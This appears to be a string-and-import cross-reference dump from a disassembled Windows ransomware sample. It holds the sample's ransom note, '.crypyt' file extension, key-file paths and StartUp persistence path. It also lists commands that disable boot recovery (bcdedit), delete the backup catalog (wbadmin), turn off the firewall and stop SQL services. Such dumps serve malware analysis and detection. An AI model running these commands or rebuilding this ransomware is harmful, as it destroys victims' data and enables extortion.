reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x410195	0x4101ab	string	0x40ff10	RQ脀\t blocks=Basic Latin,CJK Unified Ideographs
0x4101ca	0x4f5150	import	0x40ff10	KERNEL32.dll.lstrcmpW
0x4101fc	0x516bb0	string	0x40ff10	\Read-this.txt
0x4103d7	0x4f512c	import	0x40ff10	KERNEL32.dll.FindNextFileW
0x4103f1	0x4f5138	import	0x40ff10	KERNEL32.dll.FindClose
0x41076a	0x516c00	string	0x410730	0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNMQWERTYUIOPASDFGHJKLZXCVBNM
0x410929	0x516d14	string	0x410860	C:\ProgramData\IDk.txt
0x41096d	0x516d2c	string	0x410860	C:\ProgramData\pkey.txt
0x410b46	0x516d2c	string	0x410860	C:\ProgramData\pkey.txt
0x410cb3	0x516d14	string	0x410860	C:\ProgramData\IDk.txt
0x410db9	0x516d44	string	0x410860	C:\ProgramData
0x410e4d	0x516d44	string	0x410860	C:\ProgramData
0x410edf	0x516bd4	string	0x410860	0123456789
0x411014	0x516be0	string	0x410860	QWERTYUIOPASDFGHJKLZXCVBNM
0x411390	0x516d14	string	0x410860	C:\ProgramData\IDk.txt
0x4117bd	0x516d2c	string	0x410860	C:\ProgramData\pkey.txt
0x4117ec	0x5168a4	string	0x410860	OutputFileName
0x41180e	0x5168c8	string	0x410860	OutputBinaryMode
0x4118b6	0x516d58	string	0x410860	95DE4925807931C8D34E1D9460A2DE
0x4118e0	0x516d78	string	0x410860	4D2E0F75F1B2499AC0A49EED96F81C9F301AFBE0741530B13E9F0630212DB2DC766CD2D213E1DDE0A7EF8E74182EC3C98ACE5FB67D70AE03053412B2A2E9D09107A0DEFE6748B3100EB8BD2117D6D91AA3A4FC6C98884600F513241A57002F5B2B500831BE3C82967B5AA5652B0B87BCB65963064D61E236FF1B30F3351C9E08759E34BB66A3A81256502169950DF22EB80496AA8E3A3AB84B1D05B0EB4D57F5B16AD80383ECB6B694CBE8843711C87AD13D8DE410F584B9E84139B806C9D968437690B9AD54E41BC2FF71E49180479A77D1CA61456D8E94867BA6C50D3118BBDD4D43E45305276B9F598137EC4188796F75C22578C2F3D4B268C84FC592C28855834D5444AB39CA6F5887C9D731643056E60B008591B37DE5474836A3AD65DE730B8E978B38DD0455007FBCC49969BE20D65B8FE0844EC7294B794B8C269E19A55F024D903D2E25929C66F3AEA56C9BE5D328BF2491027A634F68252D52F57813780B5C5CC89E9222318CC528DDAC9BDF5A95032CD047D6C33726A25DA44955C70D8B3B4EF78A3712A8AA8C1C9139AC703DA00ED2EB99C445836DF610D831D3591447FA252D7AF179CB1002A77BBFEB60F129275873F2EC54C372DF2CF829139DE208884B9DAEE8
0x411af5	0x51710c	string	0x410860	https://api.my-ip.io/ip
0x411bbc	0x517124	string	0x410860	%d-%m-%Y %H:%M:%S
0x411c29	0x517138	string	0x410860	C:\ProgramData\prvkey.txt
0x411d1f	0x517178	string	0x410860	\n\nID=
0x411d41	0x51716c	string	0x410860	Disksize=
0x411e39	0x517164	string	0x410860	Mail=
0x411ef8	0x51715c	string	0x410860	Ip=
0x411fb4	0x517154	string	0x410860	Date:
0x412512	0x517138	string	0x410860	C:\ProgramData\prvkey.txt
0x412555	0x517180	string	0x410860	C:\ProgramData\prvkey.txt.key
0x4129c4	0x516a50	string	0x410860	
0x412d29	0x4f5134	import	0x410860	KERNEL32.dll.GetDriveTypeA
0x412e84	0x5171d0	string	0x410860	fuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyou
0x413085	0x4a7ebb	string	0x410860	j\fhؘR blocks=Basic Latin,Arabic
0x4136ba	0x4f514c	import	0x413580	KERNEL32.dll.FreeConsole
0x41375a	0x516d58	string	0x413580	95DE4925807931C8D34E1D9460A2DE
0x41377b	0x5172d0	string	0x413580	16346E3C7924457CEAA77D7840E29B5D76FA489C9E4625BF1B89D551CCE746EACEF48299BA30A48DA87A0A756828F5BB14D52EDDA0D3A82698186F2233C4173CFB37E0E9A0FAD6653F72E94B1A27A95BAEFCF13078C387A4
0x413794	0x517388	string	0x413580	A010E1CB8C86711D5BD99ACFBFC60480D79592522AC687668CB9FFF15297BF57EE02D9409A4A674BF519A1DA7DA4A30E6C912F37219EE743DF7077E2781C3693D583425E653AAC59D092BB54D00F154EA648BE4449931C1D8F201E703651966E96C447D0B9432E50
0x413ab6	0x51745c	string	0x413580	.crypyt
0x413b45	0x517464	string	0x413580	net stop MSDTC
0x413b4f	0x517474	string	0x413580	bcdedit /set {default} bootstatuspolicy ignoreallfailures
0x413b59	0x5174b0	string	0x413580	bcdedit /set {default} recoveryenabled no
0x413b63	0x5174dc	string	0x413580	wbadmin delete catalog -quiet
0x413b6d	0x5174fc	string	0x413580	net stop SQLSERVERAGENT
0x413b77	0x517514	string	0x413580	net stop MSSQLSERVER
0x413b81	0x51752c	string	0x413580	net stop vds
0x413b8b	0x51753c	string	0x413580	netsh advfirewall set currentprofile state off
0x413b95	0x51756c	string	0x413580	netsh firewall set opmode mode=disable
0x413b9f	0x517594	string	0x413580	net stop SQLWriter
0x413ba9	0x5175a8	string	0x413580	net stop SQLBrowser
0x413bb3	0x517514	string	0x413580	net stop MSSQLSERVER
0x413bbd	0x5175bc	string	0x413580	net stop MSSQL$CONTOSO1
0x413c29	0x4f5134	import	0x413580	KERNEL32.dll.GetDriveTypeA
0x413dc2	0x4a8530	string	0x413580	WVS3
0x413dd0	0x4a8530	string	0x413580	WVS3
0x413f6d	0x517608	string	0x413580	All Your Files Has Been Encrypted\n\nYou Have to Pay to Get Your Files Back\n\n1-Go to C:\ProgramData\ or in Your other Drives and send us prvkey.txt.key file \n\n2-You can send some file little than 1mb for Decryption test to trust us But the test File should not contain valuable data\n\n3-Payment should be with Bitcoin\n\n\n4-Changing Windows without saving prvkey.txt.key file will cause permanete Data loss\n\n\nOur Email:
0x413f97	0x5175d4	string	0x413580	\n\nin Case of no Answer:
0x41417f	0x4f5134	import	0x413580	KERNEL32.dll.GetDriveTypeA
0x4146b1	0x4146b7	string	0x413580	뜺PyQ blocks=Hangul Syllables,Basic Latin
0x41473d	0x516a88	string	0x413580	Unhandled exception caught
0x414ba0	0x5169dc	string	0x413580	space
0x414c20	0x517274	string	0x413580	Unhandled exception\n
0x4151f7	0x415202	string	0x415180	3ɉN`Ɔ blocks=Basic Latin,Latin Extended-B
0x415b08	0x415b19	string	0x415ac0	3ɉO` blocks=Basic Latin,Latin Extended-B
0x415b0e	0x415b19	string	0x415ac0	3ɉO` blocks=Basic Latin,Latin Extended-B
0x415bcb	0x516858	string	0x415bc0	SHA-1
0x415d57	0x517958	string	0x415d20	OutputStringPointer
0x415d62	0x415d76	string	0x415d20	hlyQ
0x416a17	0x416a29	string	0x416960	3ۋE\b blocks=Basic Latin,Arabic
0x416a3c	0x416a83	string	0x416960	VS膌\n blocks=Basic Latin,CJK Unified Ideographs
0x417093	0x417097	string	0x417070	WPRQ
0x417bc2	0x417bf7	string	0x417ae0	;O\fs
0x419354	0x41935f	string	0x419300	3ɉN` blocks=Basic Latin,Latin Extended-B
0x419f3a	0x419f4b	string	0x419f10	3ɉO` blocks=Basic Latin,Latin Extended-B
0x419f40	0x419f4b	string	0x419f10	3ɉO` blocks=Basic Latin,Latin Extended-B
0x41ac43	0x5179fc	string	0x41ac10	BufferedTransformation: this object doesn't allow input
0x41ad0d	0x41ad41	string	0x41ace0	hdzQ
0x41ada3	0x5179fc	string	0x41ad70	BufferedTransformation: this object doesn't allow input
0x41c370	0x517a34	string	0x41c370	vector<T> too long
0x41cf8d	0x516994	string	0x41cf40	MGF1
0x41d012	0x516858	string	0x41cf40	SHA-1
0x41d1ec	0x41d1fd	string	0x41d1c0	hdzQ
0x41d230	0x517aa0	string	0x41d230	invalid string position
0x41d9b8	0x5171c0	string	0x41d950	prvkey.txt.key
0x41e00b	0x516860	string	0x41dfd0	FeedbackSize
0x41eaa1	0x516b1c	string	0x41e930	shit
0x41fd6e	0x41fd82	string	0x41fc50	QW譄\b blocks=Basic Latin,CJK Unified Ideographs
0x420d50	0x517ab8	string	0x420d50	string too long
0x421487	0x51654c	string	0x421380	false
0x4214a0	0x516554	string	0x421380	true
0x4221fc	0x51728c	string	0x4221f0	C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\
0x423041	0x423010	string	0x422fd0	;}\ftAf
0x423054	0x423010	string	0x422fd0	;}\ftAf
0x4235b3	0x4f54c0	string	0x423590	easy handle already used in multi handle
0x425057	0x4f54f0	string	0x423860	SESS
0x425097	0x4f54f8	string	0x423860	FLUSH
0x4250c1	0x4f5500	string	0x423860	RELOAD
0x42512f	0x4f5508	string	0x423860	Set-Cookie:
0x425814	0x425829	string	0x423860	9Xht#
0x42582c	0x425851	string	0x423860	9Xlt
0x426dd1	0x4a8530	string	0x426d90	WVS3
0x426f49	0x4f56f0	string	0x426d90	Internal error removing splay node = %d\n
0x426fe3	0x4f571c	string	0x426fa0	Internal error clearing splay node = %d\n
0x4270ac	0x4270e1	string	0x427070	][^_Y
0x4271e0	0x4f53b8	import	0x4270f0	WS2_32.dll.closesocket
0x42763f	0x4f5348	import	0x427290	WS2_32.dll.recv
0x4276e6	0x427407	string	0x427290	]_^[
0x427c6d	0x4f53b8	import	0x427ba0	WS2_32.dll.closesocket
0x428811	0x4f559c	string	0x4286d0	Resolving timed out after %I64d milliseconds
0x428845	0x4f55cc	string	0x4286d0	Connection timed out after %I64d milliseconds
0x42889c	0x4f5600	string	0x4286d0	Operation timed out after %I64d milliseconds with %I64d out of %I64d bytes received
0x4288cd	0x4f5658	string	0x4286d0	Operation timed out after %I64d milliseconds with %I64d bytes received
0x428a09	0x4f56a0	string	0x4286d0	Transfer was pending, now try another\n
0x428b38	0x4f56c8	string	0x4286d0	Hostname '%s' was found in DNS cache\n
0x4293a6	0x4293c0	string	0x4286d0	j\vRQV
0x4293a8	0x4293ae	string	0x4286d0	j\vPSV
0x4293ac	0x4293c0	string	0x4286d0	j\vRQV
0x4296c6	0x4296ea	string	0x4286d0	j\vPSV
0x429a8a	0x429af9	string	0x429a20	3\t\a3
0x429a94	0x429af9	string	0x429a20	3\t\a3
0x429ac1	0x429af9	string	0x429a20	3\t\a3
0x429c2a	0x429c20	string	0x429b30	;(t\rA
0x429f9f	0x42a659	string	0x429f00	j\nhLXO
0x42a01a	0x4f5778	string	0x429f00	%4095[^;\r\n=] =%4095[^;\r\n]
0x42a13a	0x4f57c8	string	0x429f00	__Secure-
0x42a158	0x4f57d4	string	0x429f00	__Host-
0x42a1b1	0x4f57dc	string	0x429f00	secure
0x42a1e7	0x4f57e4	string	0x429f00	httponly
0x42a211	0x4f57f0	string	0x429f00	path
0x42a25e	0x4f57f8	string	0x429f00	domain
0x42a288	0x4f576c	string	0x429f00	localhost
0x42a369	0x4f5804	string	0x429f00	skipped cookie with bad tailmatch domain: %s\n
0x42a3bb	0x4f5834	string	0x429f00	version
0x42a3e6	0x4f583c	string	0x429f00	max-age
0x42a411	0x4f5844	string	0x429f00	expires
0x42a4b7	0x4463b0	string	0x429f00	QSUVW
0x42a4de	0x4f5794	string	0x429f00	oversized cookie dropped, name/val %zu + %zu bytes\n
0x42aea6	0x42b1a1	string	0x42ae80	_^]3
0x42aeb2	0x42b1a1	string	0x42ae80	_^]3
0x42b260	0x42b2b1	string	0x42b230	_^]3
0x42b264	0x4f58b8	string	0x42b230	none
0x42b2a2	0x42b2b1	string	0x42b230	_^]3
0x42b2a6	0x42b2b1	string	0x42b230	_^]3
0x42b373	0x4f5508	string	0x42b230	Set-Cookie:
0x42b3d5	0x42b370	string	0x42b230	j\vVh\bUO
0x42b48d	0x4f58b8	string	0x42b420	none
0x42b4e4	0x4f5748	string	0x42b420	ignoring failed cookie_init for %s\n
0x42b505	0x42b561	string	0x42b420	3ۋ|$ blocks=Basic Latin,Arabic
0x42b54d	0x42b561	string	0x42b420	3ۋ|$ blocks=Basic Latin,Arabic
0x42b5ab	0x4f5508	string	0x42b420	Set-Cookie:
0x42b6ce	0x4f59a0	string	0x42b680	WARNING: failed to save cookies in %s\n
0x42b833	0x4f58e4	string	0x42b760	%s.%s.tmp
0x42b87d	0x4f58f8	string	0x42b760	# Netscape HTTP Cookie File\n# https://curl.haxx.se/docs/http-cookies.html\n# This file was generated by libcurl! Edit at your own risk.\n\n
0x42b96c	0x4f5984	string	0x42b760	#\n# Fatal libcurl error\n
0x42bc2f	0x516658	string	0x42bc20	unknown
0x42bc74	0x4f5864	string	0x42bc20	FALSE
0x42bc7d	0x4f585c	string	0x42bc20	TRUE
0x42bc97	0x4f584c	string	0x42bc20	#HttpOnly_
0x42bcac	0x4f58c8	string	0x42bc20	%s%s%s\t%s\t%s\t%s\t%I64d\t%s\t%s
0x42bfe2	0x4f515c	import	0x42bec0	KERNEL32.dll.InitializeCriticalSectionEx
0x42c02e	0x4f59f8	string	0x42bec0	getaddrinfo() thread failed to start\n
0x42c214	0x4f5154	import	0x42c1e0	KERNEL32.dll.EnterCriticalSection
0x42c220	0x4f5158	import	0x42c1e0	KERNEL32.dll.LeaveCriticalSection
0x42c43c	0x4f5154	import	0x42c420	KERNEL32.dll.EnterCriticalSection
0x42c44f	0x4f5158	import	0x42c420	KERNEL32.dll.LeaveCriticalSection
0x42c49c	0x4f53b8	import	0x42c420	WS2_32.dll.closesocket
0x42c4cc	0x4f5160	import	0x42c4c0	KERNEL32.dll.DeleteCriticalSection
0x42c502	0x4f53b8	import	0x42c4c0	WS2_32.dll.closesocket
0x42c608	0x4f59cc	string	0x42c600	proxy
0x42c60d	0x4f59d4	string	0x42c600	host
0x42c629	0x4f59dc	string	0x42c600	Could not resolve %s: %s
0x42ce0a	0x42ce55	string	0x42ce00	_^]3
0x42cf06	0x4f5d0c	string	0x42cec0	Content-Type
0x42cf42	0x4f5d74	string	0x42cec0	multipart/mixed
0x42cf6e	0x4f5d84	string	0x42cec0	application/octet-stream
0x42cf9c	0x4f5cb0	string	0x42cec0	text/plain
0x42cfbb	0x4f5da0	string	0x42cec0	Content-Disposition
0x42cff8	0x4f5db4	string	0x42cec0	multipart/
0x42d00e	0x4f5dc0	string	0x42cec0	attachment
0x42d017	0x4f5dc0	string	0x42cec0	attachment
0x42d027	0x42d037	string	0x42cec0	9|$$
0x42d02c	0x42d037	string	0x42cec0	9|$$
0x42d0aa	0x4f5dd0	string	0x42cec0	; filename="
0x42d0bf	0x4f5de0	string	0x42cec0	; name="
0x42d0cf	0x4f5dec	string	0x42cec0	Content-Disposition: %s%s%s%s%s%s%s
0x42d112	0x4f5d50	string	0x42cec0	; boundary=
0x42d11c	0x4f5d5c	string	0x42cec0	Content-Type: %s%s%s
0x42d13b	0x4f5e10	string	0x42cec0	Content-Transfer-Encoding
0x42d15c	0x42d174	string	0x42cec0	Ph,^O
0x42d16f	0x4f5c20	string	0x42cec0	8bit
0x42d175	0x4f5e2c	string	0x42cec0	Content-Transfer-Encoding: %s
0x42d1b8	0x4f5e4c	string	0x42cec0	multipart/form-data
0x42d1cd	0x4f5e60	string	0x42cec0	form-data
0x42d2ca	0x4f5d30	string	0x42d260	Can't add itself as a subpart!
0x42d3b9	0x4f5d0c	string	0x42d320	Content-Type
0x42d8d9	0x4f5e70	string	0x42d8c0	----------------%ld%s
0x42d9fb	0x4f5d30	string	0x42d990	Can't add itself as a subpart!
0x42deb5	0x4f5d28	string	0x42ddd0	--\r\n
0x42e122	0x4f5d0c	string	0x42e040	Content-Type
0x42e155	0x42e120	string	0x42e040	j\fh\f]O
0x42e3b5	0x42e3d5	string	0x42e350	j\fh\f]O
